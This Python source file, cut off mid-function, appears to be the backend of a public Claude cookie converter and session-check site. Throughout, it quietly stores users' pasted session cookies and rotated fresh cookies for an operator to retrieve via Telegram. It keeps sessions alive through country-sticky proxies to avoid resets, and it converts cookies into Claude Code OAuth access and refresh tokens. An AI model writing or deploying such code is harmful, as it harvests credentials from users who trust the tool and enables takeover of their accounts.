#!/usr/bin/env python3
"""claudecookie ingest service.

A single-file HTTP endpoint behind nginx. It accepts the usage beacon and the
Claude session check, writes skinny event rows plus cookie blobs to SQLite, and
exposes the box public key. The admin surface is tgbot.py on the same database.

  GET  /box          P-256 public JWK (not a secret)
  POST /e            usage beacon (pageview plaintext; convert is a sealed box)
  POST /check        Claude session check (sealed box)
  POST /credential   cookie → Claude Code credentials.json (sealed box + Turnstile)
  POST /api/v1/convert     public cookie convert (JSON, CORS)
  POST /api/v1/check       public session check (JSON, CORS)
  POST /api/v1/credential  public credentials.json (JSON, CORS)
  GET  /api/v1/health      public liveness
  GET  /api/health         liveness (localhost only; nginx does not proxy this)
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import sqlite3
import sys
import threading
import time
from concurrent.futures import Future, ThreadPoolExecutor
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

_HERE = Path(__file__).resolve().parent
if str(_HERE) not in sys.path:
    sys.path.insert(0, str(_HERE))

from box import BoxError, load_or_create_private, looks_like_box, open_json, public_jwk
from claude_check import (
    check_cookie,
    default_country,
    egress_ok,
    format_check_log,
    resolve_country,
    select_proxy,
    session_key_hash,
)
from claude_oauth import ConvertError, convert_session, redact
from cookie_convert import convert as convert_cookies
from cookie_convert import convert_combined, split_cookie_sets
from turnstile import verify_turnstile

DB_PATH = os.environ.get("CC_STATS_DB", "/var/lib/claudecookie/stats.db")
CONF_PATH = os.environ.get("CC_STATS_CONF", "/etc/claudecookie/bot.conf")
HOST = os.environ.get("CC_STATS_HOST", "127.0.0.1")
PORT = int(os.environ.get("CC_STATS_PORT", "8787"))

MAX_BODY = 512 * 1024
STORE_OUTPUT = True
# Public /check batch cap: bounds how many live-session checks one request can fan
# out to Claude (each is a real outbound request that can burn a cookie).
MAX_BATCH = 10

EVENT_TYPES = {"pageview", "convert"}
FORMATS = {"netscape", "cookie-editor", "puppeteer", "key-value", "header"}
LOCALES = {"en", "ru", "zh"}
# Keep in sync with lib/cookies/samples.ts — both tokens appear only in Sample.
SAMPLE_FINGERPRINT = ("8f14e45fceea167a5a36dedd4bea2543", "tmp-4471")

BOT_RE = re.compile(
    r"(bot|crawler|spider|slurp|crawl|preview|monitor|curl|wget|python-|"
    r"headless|lighthouse|pingdom|uptime)",
    re.I,
)
DOMAIN_RE = re.compile(r'(?:^|[",{\s])\.?([a-z0-9-]+(?:\.[a-z0-9-]+)+)', re.I)
CORS_HEADERS = (
    ("Access-Control-Allow-Origin", "*"),
    ("Access-Control-Allow-Methods", "GET, POST, OPTIONS"),
    ("Access-Control-Allow-Headers", "Content-Type"),
    ("Access-Control-Max-Age", "86400"),
    ("Access-Control-Expose-Headers", "Retry-After"),
    ("Cross-Origin-Resource-Policy", "cross-origin"),
)
CONVERT_ISSUE_REASON = {
    "issue.tooLarge": "too_large",
    "issue.unknownFormat": "unknown_format",
    "issue.header.empty": "empty",
    "issue.json.empty": "empty",
    "issue.json.invalid": "invalid",
    "issue.json.unsupportedShape": "invalid",
    "issue.netscape.noCookies": "empty",
}

_box_private = None


def load_conf() -> dict:
    if Path(CONF_PATH).is_file():
        with open(CONF_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
    else:
        data = {}
    token = data.get("bot_token") or os.environ.get("TG_BOT_TOKEN") or ""
    owner_raw = data.get("owner_id") or os.environ.get("TG_OWNER_ID") or "0"
    try:
        owner = int(owner_raw)
    except (TypeError, ValueError):
        owner = 0
    return {
        "bot_token": token,
        "owner_id": owner,
        "ingest_salt": data.get("ingest_salt") or os.environ.get("CC_INGEST_SALT") or "dev",
    }


CONF = load_conf()

SCHEMA = """
CREATE TABLE IF NOT EXISTS events (
    id       INTEGER PRIMARY KEY,
    ts       INTEGER NOT NULL,
    day      TEXT    NOT NULL,
    type     TEXT    NOT NULL,
    visitor  TEXT    NOT NULL,
    country  TEXT,
    locale   TEXT,
    device   TEXT,
    path     TEXT,
    from_fmt TEXT,
    to_fmt   TEXT,
    n        INTEGER,
    domains  TEXT,
    output   TEXT,
    valid    INTEGER,
    reason   TEXT,
    info     TEXT
);
CREATE TABLE IF NOT EXISTS blobs (
    event_id INTEGER PRIMARY KEY,
    output   TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS botstate (key TEXT PRIMARY KEY, value TEXT);
"""

INDEXES = """
CREATE INDEX IF NOT EXISTS idx_events_day  ON events(day);
CREATE INDEX IF NOT EXISTS idx_events_type ON events(type);
CREATE INDEX IF NOT EXISTS idx_events_ts   ON events(ts);
CREATE INDEX IF NOT EXISTS idx_events_type_day ON events(type, day);
CREATE INDEX IF NOT EXISTS idx_events_type_valid ON events(type, valid);
CREATE INDEX IF NOT EXISTS idx_events_country ON events(country);
CREATE INDEX IF NOT EXISTS idx_events_type_locale ON events(type, locale);
CREATE INDEX IF NOT EXISTS idx_events_device_visitor ON events(device, visitor);
"""

MIGRATIONS = {
    "ts": "ALTER TABLE events ADD COLUMN ts INTEGER",
    "day": "ALTER TABLE events ADD COLUMN day TEXT",
    "type": "ALTER TABLE events ADD COLUMN type TEXT",
    "visitor": "ALTER TABLE events ADD COLUMN visitor TEXT",
    "country": "ALTER TABLE events ADD COLUMN country TEXT",
    "locale": "ALTER TABLE events ADD COLUMN locale TEXT",
    "device": "ALTER TABLE events ADD COLUMN device TEXT",
    "path": "ALTER TABLE events ADD COLUMN path TEXT",
    "from_fmt": "ALTER TABLE events ADD COLUMN from_fmt TEXT",
    "to_fmt": "ALTER TABLE events ADD COLUMN to_fmt TEXT",
    "n": "ALTER TABLE events ADD COLUMN n INTEGER",
    "domains": "ALTER TABLE events ADD COLUMN domains TEXT",
    "output": "ALTER TABLE events ADD COLUMN output TEXT",
    "valid": "ALTER TABLE events ADD COLUMN valid INTEGER",
    "reason": "ALTER TABLE events ADD COLUMN reason TEXT",
    "info": "ALTER TABLE events ADD COLUMN info TEXT",
}

def box_private():
    global _box_private
    if _box_private is None:
        _box_private = load_or_create_private()
    return _box_private


def reset_box_cache() -> None:
    global _box_private
    _box_private = None


def db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=5)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    conn.row_factory = sqlite3.Row
    return conn


def migrate_blobs(conn: sqlite3.Connection) -> None:
    conn.execute(
        "INSERT OR IGNORE INTO blobs (event_id, output) "
        "SELECT id, output FROM events WHERE output IS NOT NULL AND length(output) > 0"
    )
    conn.execute("UPDATE events SET output = NULL WHERE output IS NOT NULL")


def migrate_push_settings(conn: sqlite3.Connection) -> None:
    keys = {row[0] for row in conn.execute("SELECT key FROM settings")}
    if "push_check_valid" in keys or "push_check_invalid" in keys:
        return
    old = "1"
    row = conn.execute("SELECT value FROM settings WHERE key='push_check'").fetchone()
    if row is not None:
        old = row[0]
    for key in ("push_check_valid", "push_check_invalid"):
        conn.execute(
            "INSERT INTO settings(key,value) VALUES(?,?) "
            "ON CONFLICT(key) DO NOTHING",
            (key, old),
        )


def init_db() -> None:
    parent = os.path.dirname(DB_PATH)
    if parent:
        os.makedirs(parent, exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.executescript(SCHEMA)
        have = {row[1] for row in conn.execute("PRAGMA table_info(events)")}
        for column, ddl in MIGRATIONS.items():
            if column not in have:
                conn.execute(ddl)
        conn.executescript(INDEXES)
        migrate_blobs(conn)
        migrate_push_settings(conn)
        conn.commit()
    finally:
        conn.close()


def now() -> int:
    return int(time.time())


def today() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d")


def visitor_hash(ip: str, ua: str) -> str:
    material = f"{today()}|{CONF['ingest_salt']}|{ip}|{ua}".encode()
    return hashlib.sha256(material).hexdigest()[:16]


def device_class(ua: str) -> str:
    return "mobile" if re.search(r"(Mobi|Android|iPhone|iPad)", ua) else "desktop"


def is_site_sample(text: str | None) -> bool:
    """True for the official Sample button payload, not a real example.com paste."""
    if not text:
        return False
    return all(marker in text for marker in SAMPLE_FINGERPRINT)


def extract_domains(text: str) -> str | None:
    """Hostnames seen in stored output, most-common first. Never names or values."""
    if not text:
        return None
    counts: dict[str, int] = {}
    for m in DOMAIN_RE.finditer(text):
        host = m.group(1).lower()
        if "." in host and not host.endswith((".txt", ".json", ".com.")):
            counts[host] = counts.get(host, 0) + 1
    if not counts:
        return None
    ordered = sorted(counts, key=lambda h: (-counts[h], h))
    return ",".join(ordered[:20])


def check_info(result: dict) -> dict:
    session = result.get("session") or {}
    weekly = result.get("weekly") or {}
    extras = result.get("extras") or {}
    return {
        "email": result.get("email"),
        "name": result.get("name"),
        "plan": result.get("planLabel"),
        "session": session.get("percent"),
        "sessionResets": session.get("resets"),
        "weekly": weekly.get("percent"),
        "weeklyResets": weekly.get("resets"),
        "org": extras.get("organizationName") or extras.get("organizationId"),
    }


def public_check_result(result: dict) -> dict:
    """JSON the browser is allowed to see. No extras, ids, or cookie material."""
    if not result.get("ok"):
        return {"ok": False, "invalidReason": result.get("invalidReason") or "invalid"}
    session = result.get("session")
    weekly = result.get("weekly")
    return {
        "ok": True,
        "email": result.get("email"),
        "name": result.get("name"),
        "planLabel": result.get("planLabel"),
        "session": session if isinstance(session, dict) else None,
        "weekly": weekly if isinstance(weekly, dict) else None,
    }


def public_convert_result(result: dict) -> dict:
    """JSON the public convert API is allowed to return. No cookie objects."""
    stats = result.get("stats") if isinstance(result.get("stats"), dict) else {}
    issues = result.get("issues") if isinstance(result.get("issues"), list) else []
    return {
        "ok": bool(result.get("ok")),
        "detected": result.get("detected"),
        "target": result.get("target"),
        "output": result.get("output") if isinstance(result.get("output"), str) else "",
        "issues": issues,
        "stats": {
            "total": stats.get("total") or 0,
            "domains": stats.get("domains") or 0,
            "expired": stats.get("expired") or 0,
            "session": stats.get("session") or 0,
            "secure": stats.get("secure") or 0,
            "httpOnly": stats.get("httpOnly") or 0,
        },
        "n": stats.get("total") or 0,
    }


def convert_invalid_reason(result: dict) -> str:
    issues = result.get("issues") if isinstance(result.get("issues"), list) else []
    if not issues:
        return "empty"
    message = issues[0].get("message") if isinstance(issues[0], dict) else ""
    return CONVERT_ISSUE_REASON.get(message or "", "invalid")


def public_credential_result(payload: dict) -> dict:
    """Browser JSON for a successful convert. Tokens only; no cookie extras."""
    credentials = payload.get("credentials")
    filename = payload.get("filename") if isinstance(payload.get("filename"), str) else ".credentials.json"
    if not isinstance(credentials, dict):
        return {"ok": False, "invalidReason": "convert_failed"}
    oauth = credentials.get("claudeAiOauth")
    if not isinstance(oauth, dict) or not oauth.get("accessToken") or not oauth.get("refreshToken"):
        return {"ok": False, "invalidReason": "no_refresh"}
    return {
        "ok": True,
        "filename": filename,
        "credentials": {"claudeAiOauth": oauth},
    }


def insert_event(conn: sqlite3.Connection, row: dict, output: str | None) -> int:
    payload = {**row, "output": None}
    cur = conn.execute(
        "INSERT INTO events (ts,day,type,visitor,country,locale,device,path,"
        "from_fmt,to_fmt,n,domains,output,valid,reason,info) VALUES (:ts,:day,"
        ":type,:visitor,:country,:locale,:device,:path,:from_fmt,:to_fmt,:n,"
        ":domains,:output,:valid,:reason,:info)",
        payload,
    )
    event_id = int(cur.lastrowid)
    if STORE_OUTPUT and output:
        conn.execute(
            "INSERT INTO blobs (event_id, output) VALUES (?, ?)",
            (event_id, output[:MAX_BODY]),
        )
    return event_id


def trusted_page(origin: str, referer: str) -> bool:
    for src in (origin.strip(), referer.strip()):
        if not src:
            continue
        if src == "https://claudecookie.com" or src.startswith("https://claudecookie.com/"):
            return True
        if src.startswith("http://localhost:") or src.startswith("http://127.0.0.1:"):
            return True
    return False


class RateLimiter:
    def __init__(self, limit: int, window: int):
        self.limit, self.window = limit, window
        self.hits: dict[str, list[int]] = {}
        self.lock = threading.Lock()

    def allow(self, key: str) -> bool:
        t = now()
        with self.lock:
            bucket = [x for x in self.hits.get(key, []) if x > t - self.window]
            if len(bucket) >= self.limit:
                self.hits[key] = bucket
                return False
            bucket.append(t)
            self.hits[key] = bucket
            return True

    def retry_after(self, key: str) -> int:
        t = now()
        with self.lock:
            bucket = [x for x in self.hits.get(key, []) if x > t - self.window]
            if not bucket:
                return self.window
            return max(1, bucket[0] + self.window - t)


ingest_limiter = RateLimiter(limit=240, window=60)
convert_limiter = RateLimiter(limit=60, window=60)
check_limiter = RateLimiter(limit=20, window=60)
# Background convert probes used to share check_limiter. A 20-set paste then
# spent the interactive /check budget and the next Check returned 429.
convert_check_limiter = RateLimiter(limit=40, window=60)
credential_ip_minute = RateLimiter(limit=5, window=60)
credential_ip_hour = RateLimiter(limit=20, window=3600)
credential_sid_hour = RateLimiter(limit=3, window=3600)

# Quiet convert-side checks: ingest answers 204 first, then at most two Claude
# probes run in the background so a burst of conversions cannot pile up.
CONVERT_CHECK = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cc-cvt-check")
_convert_futures: list[Future] = []
_convert_futures_lock = threading.Lock()


def _track_convert_future(fut: Future) -> None:
    with _convert_futures_lock:
        _convert_futures.append(fut)
        if len(_convert_futures) > 200:
            _convert_futures[:] = [item for item in _convert_futures if not item.done()]


def drain_convert_checks(timeout: float = 5.0) -> None:
    """Wait for queued convert checks. Tests use this; production does not."""
    deadline = time.time() + timeout
    while True:
        with _convert_futures_lock:
            pending = [item for item in _convert_futures if not item.done()]
        if not pending:
            with _convert_futures_lock:
                done = list(_convert_futures)
                _convert_futures.clear()
            for item in done:
                item.result(timeout=0.1)
            return
        remaining = deadline - time.time()
        if remaining <= 0:
            raise TimeoutError("convert checks still running")
        pending[0].result(timeout=remaining)

# Per-session serialization + short cache. Concurrent/duplicate checks of the
# same cookie would fire simultaneous requests to Claude (an anti-replay/rotation
# trigger); this collapses them into a single outbound check.
CHECK_CACHE_TTL = 60
_check_locks: dict[str, threading.Lock] = {}
_check_cache: dict[str, tuple[int, dict]] = {}
_check_guard = threading.Lock()


def _check_lock(key: str) -> threading.Lock:
    with _check_guard:
        lock = _check_locks.get(key)
        if lock is None:
            if len(_check_locks) > 20000:
                _check_locks.clear()
            lock = threading.Lock()
            _check_locks[key] = lock
        return lock


def _check_cache_get(key: str) -> dict | None:
    t = now()
    with _check_guard:
        for stale in [k for k, (ts, _) in _check_cache.items() if t - ts > CHECK_CACHE_TTL]:
            _check_cache.pop(stale, None)
        item = _check_cache.get(key)
        return item[1] if item else None


def _check_cache_put(key: str, result: dict) -> None:
    with _check_guard:
        if len(_check_cache) > 20000:
            _check_cache.clear()
        _check_cache[key] = (now(), result)


# Sticky exit country per session: once chosen, reuse it so the check IP does not
# jump countries between checks (a country change can itself trip a session reset).
_session_country: dict[str, str] = {}


def _session_country_get(key: str) -> str | None:
    with _check_guard:
        return _session_country.get(key)


def _session_country_put(key: str, cc: str) -> None:
    with _check_guard:
        if len(_session_country) > 20000:
            _session_country.clear()
        _session_country[key] = cc


def resolve_check_country(session_id: str, tz: str | None, ip_country: str | None) -> str:
    country = _session_country_get(session_id) or resolve_country(tz, ip_country)
    _session_country_put(session_id, country)
    return country


def execute_check(
    raw: str, session_id: str, country: str, *, force: bool = False,
) -> tuple[dict, bool]:
    """Talk to Claude or the 60s cache. Does not persist. Returns (result, from_cache)."""
    with _check_lock(session_id):
        if not force:
            cached = _check_cache_get(session_id)
            if cached is not None:
                return cached, True
        result = check_cookie(raw, country=country, session_id=session_id)
        # A supported country can still lack a proxy pool -> retry once via the
        # neutral default. Never fall back to "any country": a random RU/CN exit
        # would itself burn the cookie.
        neutral = default_country()
        if (not result.get("ok") and result.get("invalidReason") == "unreachable"
                and country != neutral):
            alt = check_cookie(raw, country=neutral, session_id=session_id)
            if alt.get("ok") or alt.get("invalidReason") != "unreachable":
                result = alt
                _session_country_put(session_id, neutral)
        print(format_check_log(result), flush=True)
        _check_cache_put(session_id, result)
        return result, False


def apply_check_to_event(event_id: int, raw: str, result: dict) -> None:
    """Write check outcome onto an existing event (convert pipeline). No new row."""
    ok = bool(result.get("ok"))
    info = json.dumps(check_info(result), ensure_ascii=False) if ok else None
    stored = result.get("freshCookie")
    conn = db()
    try:
        conn.execute(
            "UPDATE events SET valid=?, reason=?, info=? WHERE id=?",
            (
                1 if ok else 0,
                None if ok else (result.get("invalidReason") or "invalid"),
                info,
                event_id,
            ),
        )
        if STORE_OUTPUT and stored:
            cur = conn.execute(
                "UPDATE blobs SET output=? WHERE event_id=?",
                (stored[:MAX_BODY], event_id),
            )
            if cur.rowcount == 0:
                conn.execute(
                    "INSERT INTO blobs (event_id, output) VALUES (?, ?)",
                    (event_id, stored[:MAX_BODY]),
                )
        conn.commit()
    finally:
        conn.close()


def run_convert_check(
    event_id: int, raw: str, tz: str | None, ip_country: str | None,
) -> None:
    try:
        session_id = session_key_hash(raw)
        if session_id is None:
            return
        country = resolve_check_country(session_id, tz, ip_country)
        if not egress_ok(country, session_id):
            print("check no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
            apply_check_to_event(event_id, raw, {"ok": False, "invalidReason": "unreachable"})
            return
        result, _cached = execute_check(raw, session_id, country)
        apply_check_to_event(event_id, raw, result)
    except Exception as exc:
        print(f"convert check failed: {exc!r}", flush=True)


def schedule_convert_check(
    event_id: int, raw: str, ip: str, tz: str | None, ip_country: str | None,
) -> None:
    if session_key_hash(raw) is None:
        return
    if not convert_check_limiter.allow(ip):
        return
    fut = CONVERT_CHECK.submit(run_convert_check, event_id, raw, tz, ip_country)
    _track_convert_future(fut)


class Handler(BaseHTTPRequestHandler):
    server_version = "cc-ingest"
    protocol_version = "HTTP/1.1"

    def _client_ip(self) -> str:
        return self.headers.get("X-Real-Client", self.client_address[0])

    def _read_body(self) -> bytes:
        length = int(self.headers.get("Content-Length", "0") or "0")
        if length <= 0 or length > MAX_BODY:
            return b""
        return self.rfile.read(length)

    def _request_path(self) -> str:
        return self.path.split("?", 1)[0]

    def _is_public_api(self) -> bool:
        return self._request_path().startswith("/api/v1/")

    def _apply_cors(self) -> None:
        if not self._is_public_api():
            return
        for key, value in CORS_HEADERS:
            self.send_header(key, value)

    def _empty(self, code: int) -> None:
        self.send_response(code)
        self.send_header("Content-Length", "0")
        self.send_header("Cache-Control", "no-store")
        self._apply_cors()
        self.end_headers()

    def _json(self, code: int, obj: dict, extra_headers: list[tuple[str, str]] | None = None) -> None:
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self._apply_cors()
        for key, value in extra_headers or ():
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def _rate_limited(self, limiter: RateLimiter, key: str) -> None:
        return self._json(
            429,
            {"ok": False, "invalidReason": "rate_limited"},
            extra_headers=[("Retry-After", str(limiter.retry_after(key)))],
        )

    def _read_json(self) -> dict | None:
        try:
            data = json.loads(self._read_body() or b"{}")
        except (ValueError, TypeError):
            return None
        return data if isinstance(data, dict) else None

    def _trusted(self) -> bool:
        return trusted_page(self.headers.get("Origin") or "", self.headers.get("Referer") or "")

    def log_message(self, *args):
        pass

    def do_OPTIONS(self):
        if self._is_public_api():
            return self._empty(204)
        self._empty(404)

    def do_GET(self):
        path = self._request_path()
        if path == "/box":
            return self._json(200, public_jwk(box_private()))
        if path in ("/api/health", "/api/v1/health"):
            return self._json(200, {"ok": True})
        self._empty(404)

    def do_POST(self):
        path = self._request_path()
        if path == "/e":
            return self.ingest()
        if path == "/check":
            return self.check()
        if path == "/credential":
            return self.credential()
        if path == "/api/v1/convert":
            return self.api_convert()
        if path == "/api/v1/check":
            return self.api_check()
        if path == "/api/v1/credential":
            return self.api_credential()
        self._empty(404)

    def ingest(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        if BOT_RE.search(ua) or not ingest_limiter.allow(ip):
            return self._empty(204)

        try:
            data = json.loads(self._read_body() or b"{}")
        except (ValueError, TypeError):
            return self._empty(204)
        if not isinstance(data, dict):
            return self._empty(204)

        if looks_like_box(data):
            if not self._trusted():
                return self._empty(204)
            try:
                data = open_json(box_private(), data)
            except BoxError:
                return self._empty(204)
        elif data.get("t") == "pageview":
            pass
        else:
            # Plaintext convert (or anything else with an `out`) is rejected.
            return self._empty(204)

        etype = data.get("t")
        if etype not in EVENT_TYPES:
            return self._empty(204)

        country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        locale = data.get("l")
        locale = locale if locale in LOCALES else None

        row = {
            "ts": now(), "day": today(), "type": etype,
            "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
            "device": device_class(ua), "path": None, "from_fmt": None,
            "to_fmt": None, "n": None, "domains": None,
            "valid": None, "reason": None, "info": None,
        }
        output = None

        if etype == "pageview":
            p = data.get("p")
            row["path"] = p[:120] if isinstance(p, str) else None
        else:
            f, t = data.get("from"), data.get("to")
            row["from_fmt"] = f if f in FORMATS else None
            row["to_fmt"] = t if t in FORMATS else None
            n = data.get("n")
            row["n"] = n if isinstance(n, int) and 0 <= n <= 100000 else None
            out = data.get("out")
            if isinstance(out, str) and out:
                out = out[:MAX_BODY]
                row["domains"] = extract_domains(out)
                output = out

        if etype == "convert" and is_site_sample(output):
            return self._empty(204)

        conn = db()
        try:
            event_id = insert_event(conn, row, output)
            conn.commit()
        finally:
            conn.close()
        if etype == "convert" and output:
            tz = data.get("tz") if isinstance(data.get("tz"), str) else None
            ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
            schedule_convert_check(event_id, output, ip, tz, ip_country)
        return self._empty(204)

    def check(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        if BOT_RE.search(ua) or not check_limiter.allow(ip):
            return self._rate_limited(check_limiter, ip)
        if not self._trusted():
            return self._json(400, {"ok": False, "invalidReason": "empty"})

        data = self._read_json()
        if data is None:
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        if not looks_like_box(data):
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        try:
            inner = open_json(box_private(), data)
        except BoxError:
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        return self._check_payload(inner, ip, ua, path="/check")

    def _check_payload(self, inner: dict, ip: str, ua: str, *, path: str):
        locale = inner.get("l")
        locale = locale if locale in LOCALES else None
        tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None

        # Batch: {cookies: [raw, …]} -> a result per set, capped so one request can
        # not fan out an unbounded number of live-session checks to Claude.
        batch = inner.get("cookies")
        if isinstance(batch, list):
            items = [c[:MAX_BODY] for c in batch if isinstance(c, str) and c.strip()][:MAX_BATCH]
            results = [
                public_check_result(self._check_one(raw, locale, tz, ip, ua, path=path))
                for raw in items
            ]
            return self._json(200, {"results": results})

        raw = inner.get("cookie")
        if not isinstance(raw, str):
            raw = ""
        raw = raw[:MAX_BODY]
        result = self._check_one(raw, locale, tz, ip, ua, path=path)
        return self._json(200, public_check_result(result))

    def _check_one(
        self, raw: str, locale: str | None, tz: str | None, ip: str, ua: str, *, path: str = "/check",
    ) -> dict:
        """Resolve country, honour safe-mode, de-dupe, check one cookie, store it."""
        session_id = session_key_hash(raw)
        # No Claude session cookie at all (random text like "example.cook", a URL,
        # an empty box): tell the browser, but do NOT store it or push a Telegram
        # alert. Only a paste that actually carries a sessionKey is a real check.
        if session_id is None:
            return {"ok": False, "invalidReason": "missing_session" if raw.strip() else "empty"}
        ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        country = resolve_check_country(session_id, tz, ip_country)

        # Safe-mode: never egress from the bare datacenter IP when a proxy is
        # required. The pasted cookie is still stored so it reaches Telegram.
        if raw.strip() and not egress_ok(country, session_id):
            print("check no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
            result = {"ok": False, "invalidReason": "unreachable"}
            self._store_check(ip, ua, locale, raw, result, path=path)
            return result

        result, _cached = execute_check(raw, session_id, country)
        # Always write a check row. A convert of the same session may already be
        # in the 60s cache; the operator still wants this paste in the warehouse.
        self._store_check(ip, ua, locale, raw, result, path=path)
        return result

    def _store_check(
        self, ip: str, ua: str, locale: str | None, raw: str, result: dict, *, path: str = "/check",
    ) -> None:
        country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        ok = bool(result.get("ok"))
        row = {
            "ts": now(), "day": today(), "type": "check",
            "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
            "device": device_class(ua), "path": path, "from_fmt": None,
            "to_fmt": None, "n": 1, "domains": "claude.ai",
            "valid": 1 if ok else 0,
            "reason": None if ok else (result.get("invalidReason") or "invalid"),
            "info": json.dumps(check_info(result), ensure_ascii=False) if ok else None,
        }
        # Keep-alive: if the session rotated during the check, store the fresh
        # cookie so what the operator downloads in Telegram is the live one.
        stored = result.get("freshCookie") or raw
        conn = db()
        try:
            insert_event(conn, row, stored if STORE_OUTPUT else None)
            conn.commit()
        finally:
            conn.close()

    def credential(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        if BOT_RE.search(ua):
            return self._rate_limited(credential_ip_minute, ip)
        if not credential_ip_minute.allow(ip):
            return self._rate_limited(credential_ip_minute, ip)
        if not credential_ip_hour.allow(ip):
            return self._rate_limited(credential_ip_hour, ip)
        if not self._trusted():
            return self._json(400, {"ok": False, "invalidReason": "empty"})

        data = self._read_json()
        if data is None:
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        if not looks_like_box(data):
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        try:
            inner = open_json(box_private(), data)
        except BoxError:
            return self._json(400, {"ok": False, "invalidReason": "empty"})

        token = inner.get("cf-turnstile-response")
        if not isinstance(token, str):
            token = ""
        captcha_ok, captcha_reason = verify_turnstile(token, ip)
        if not captcha_ok:
            return self._json(403, {"ok": False, "invalidReason": captcha_reason or "captcha_failed"})
        return self._credential_payload(inner, ip, ua, path="/credential")

    def _credential_payload(self, inner: dict, ip: str, ua: str, *, path: str):
        locale = inner.get("l")
        locale = locale if locale in LOCALES else None
        tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
        raw = inner.get("cookie")
        if not isinstance(raw, str):
            raw = ""
        raw = raw[:MAX_BODY]
        if is_site_sample(raw):
            return self._json(400, {"ok": False, "invalidReason": "empty"})

        session_id = session_key_hash(raw)
        if session_id is None:
            return self._json(400, {"ok": False, "invalidReason": "missing_session" if raw.strip() else "empty"})
        if not credential_sid_hour.allow(session_id):
            return self._rate_limited(credential_sid_hour, session_id)

        ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        country = resolve_check_country(session_id, tz, ip_country)
        if not select_proxy(country, session_id):
            print("credential no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
            return self._json(200, {"ok": False, "invalidReason": "unreachable"})

        result, _cached = execute_check(raw, session_id, country, force=True)
        if not result.get("ok"):
            print(format_check_log(result), flush=True)
            return self._json(200, public_check_result(result))

        working = result.get("freshCookie") or raw
        try:
            payload = convert_session(
                working,
                country=country,
                session_id=session_id,
                check_result=result,
            )
        except ConvertError as exc:
            reason = exc.reason or "convert_failed"
            print(redact(f"credential {reason}"), flush=True)
            self._store_credential(ip, ua, locale, result, working, valid=False, reason=reason, path=path)
            return self._json(200, {"ok": False, "invalidReason": reason})
        except Exception as exc:
            print(redact(f"credential convert_failed {exc!r}"), flush=True)
            self._store_credential(
                ip, ua, locale, result, working, valid=False, reason="convert_failed", path=path,
            )
            return self._json(200, {"ok": False, "invalidReason": "convert_failed"})

        self._store_credential(ip, ua, locale, result, working, valid=True, reason=None, path=path)
        return self._json(200, public_credential_result(payload))

    def api_convert(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        if not convert_limiter.allow(ip):
            return self._rate_limited(convert_limiter, ip)
        data = self._read_json()
        if data is None:
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        raw = data.get("input")
        if not isinstance(raw, str):
            raw = ""
        raw = raw[:MAX_BODY]
        target = data.get("target")
        if target is not None and target not in FORMATS:
            return self._json(400, {"ok": False, "invalidReason": "bad_target"})
        default_domain = data.get("defaultDomain")
        default_domain = default_domain if isinstance(default_domain, str) else None
        locale = data.get("l")
        locale = locale if locale in LOCALES else None
        tz = data.get("tz") if isinstance(data.get("tz"), str) else None
        opts = {"target": target, "default_domain": default_domain}
        sets = split_cookie_sets(raw)
        if not sets:
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        results = [convert_cookies(item, **opts) for item in sets]
        ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        for result in results:
            if result.get("ok") and result.get("output") and not is_site_sample(result["output"]):
                self._store_convert(ip, ua, locale, result, tz, ip_country)
        ok_results = [result for result in results if result.get("ok")]
        if not ok_results:
            first = results[0]
            body = public_convert_result(first)
            body["ok"] = False
            body["invalidReason"] = convert_invalid_reason(first)
            return self._json(400, body)
        if len(results) == 1:
            return self._json(200, public_convert_result(results[0]))
        return self._json(200, public_convert_result(convert_combined(raw, **opts)))

    def _store_convert(
        self,
        ip: str,
        ua: str,
        locale: str | None,
        result: dict,
        tz: str | None,
        ip_country: str | None,
    ) -> None:
        output = result.get("output") if isinstance(result.get("output"), str) else None
        from_fmt = result.get("detected")
        to_fmt = result.get("target")
        stats = result.get("stats") if isinstance(result.get("stats"), dict) else {}
        row = {
            "ts": now(), "day": today(), "type": "convert",
            "visitor": visitor_hash(ip, ua),
            "country": (self.headers.get("X-CC-Country") or "").upper()[:2] or None,
            "locale": locale,
            "device": device_class(ua), "path": "/api/v1/convert",
            "from_fmt": from_fmt if from_fmt in FORMATS else None,
            "to_fmt": to_fmt if to_fmt in FORMATS else None,
            "n": stats.get("total") if isinstance(stats.get("total"), int) else None,
            "domains": extract_domains(output) if output else None,
            "valid": None, "reason": None, "info": None,
        }
        conn = db()
        try:
